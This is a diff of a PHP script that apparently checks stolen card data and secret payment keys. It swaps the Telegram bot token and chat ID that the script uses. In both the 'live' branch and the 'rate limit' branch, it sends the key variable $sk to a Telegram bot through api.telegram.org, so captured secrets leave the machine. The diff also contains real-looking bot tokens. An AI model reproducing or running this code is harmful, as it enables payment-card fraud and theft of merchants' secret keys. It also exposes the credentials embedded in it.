@@ -44,7 +44,7 @@ $result = curl_exec($ch);
 
 if(strpos($result, '"cvc_check": "unchecked"' )) {
     echo '#LIVE</span>  </span>:  '.$lista.'</span>  <br>➤ Response:    @ParvezOnFire2 <br>';
-file_get_contents("https://api.telegram.org/bot5408259686:AAFmTfUwyhBxXlRPx0sdRLaOYAutky3T3B4/sendMessage?chat_id=-1001680577701&text=✅<code>$sk</code> %0A @ParvezOnFire2&parse_mode=HTML");
+file_get_contents("https://api.telegram.org/bot6262738056:AAEfRm1yPP5vc9aZ3I_a7g1RWKPgPqcHuDA/sendMessage?chat_id=-1001875641465&text=✅<code>$sk</code> %0A @ParvezOnFire2&parse_mode=HTML");
 }
 
 
@@ -52,7 +52,7 @@ file_get_contents("https://api.telegram.org/bot5408259686:AAFmTfUwyhBxXlRPx0sdRL
 elseif(strpos($result,'"rate_limit"')){
     echo '#Rate_limit</span>  </span>  '.$lista.'</span>  <br>Result:Rate Limit</span><br>';
    
-file_get_contents("https://api.telegram.org/bot5408259686:AAFmTfUwyhBxXlRPx0sdRLaOYAutky3T3B4/sendMessage?chat_id=-1001680577701&text=Rate limit <code>$sk</code>%0A&parse_mode=HTML");
+file_get_contents("https://api.telegram.org/bot6262738056:AAEfRm1yPP5vc9aZ3I_a7g1RWKPgPqcHuDA/sendMessage?chat_id=-1001875641465&text=Rate limit <code>$sk</code>%0A&parse_mode=HTML");
 
    } 
 
